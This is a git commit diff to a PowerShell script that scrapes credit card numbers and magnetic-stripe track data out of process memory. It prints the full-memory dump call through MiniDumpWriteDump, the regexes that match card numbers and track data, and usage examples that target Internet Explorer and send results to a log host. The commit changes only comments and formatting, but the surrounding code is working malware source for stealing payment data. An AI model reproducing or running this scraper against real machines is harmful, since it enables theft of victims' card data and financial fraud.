5ec3954ac49058b35329f491d3c7709767b9dacf
ahhh <ahhh.db@gmail.com>
2016-01-19 23:09:42 -0800

    Update Scrape-Memory-CCs.ps1

--- Scrape-Memory-CCs.ps1
+++ Scrape-Memory-CCs.ps1
@@ -26,17 +26,17 @@ Switch to enable logging
 Switch to only scrap cc nums
 
 .EXAMPLE
-PS C:\> Import-Module Scrape-Memory-CCs.ps1
-PS C:\> Scrape-Memory-CCs -Proc iexplore -User admin
-PS C:\> Scrape-Memory-CCs -Proc iexplore -User admin -Bin 123456 -LogHost 192.168.5.5 
+PS C:\> Scrape-Memory-CCs -Proc iexplore -User bob
+PS C:\> Scrape-Memory-CCs -Proc iexplore -User bob -Bin 123456 -LogHost 192.168.5.5 
 
 .LINK
+https://github.com/ahhh/PSSE/blob/master/Scrape-Memory-CCs.ps1
 https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1
 http://scriptolog.blogspot.com/2008/01/powershell-luhn-validation.html 
-http://www.shellntel.com
+http://www.shellntel.com/blog/2015/9/16/powershell-cc-memory-scraper
 
 .NOTES
-Great script, have been adopting it slowly, may cause running program to bug out
+Great script, have been adopting it slowly
 
 #>
 	[CmdletBinding()]
@@ -96,12 +96,12 @@ Great script, have been adopting it slowly, may cause running program to bug out
 			$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
 	
 			$Result = $MiniDumpWriteDump.Invoke($null, @($ProcessHandle,
-									$ProcessId,
-									$FileStream.SafeFileHandle,
-									$MiniDumpWithFullMemory,
-									[IntPtr]::Zero,
-									[IntPtr]::Zero,
-									[IntPtr]::Zero))
+														$ProcessId,
+														$FileStream.SafeFileHandle,
+														$MiniDumpWithFullMemory,
+														[IntPtr]::Zero,
+														[IntPtr]::Zero,
+														[IntPtr]::Zero))
 	
 			$FileStream.Close()
 	
@@ -202,12 +202,12 @@ Great script, have been adopting it slowly, may cause running program to bug out
 					Write-Log "Scraping memory dump: $($d.FullName)"
 					if ($NumsOnly) 
 					{
-						# Find basic cc patern, high fp      
+						# Find basic cc num patern, high fp      
 						$nums = (Select-String -Path $d.FullName -Pattern "(4[0-9]{15}|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})" | foreach {$_.matches} | Select-String -NotMatch "(\d)\1{5,}")
 					}
 					else 
 					{
-						# We default to finding track data  
+						# Default to finding full track data  
 						$nums = (Select-String -Path $d.FullName -Pattern "\%B[\d]{16}[\^\w\s\/\d]+\?" | foreach {$_.matches})       
 					}
 			
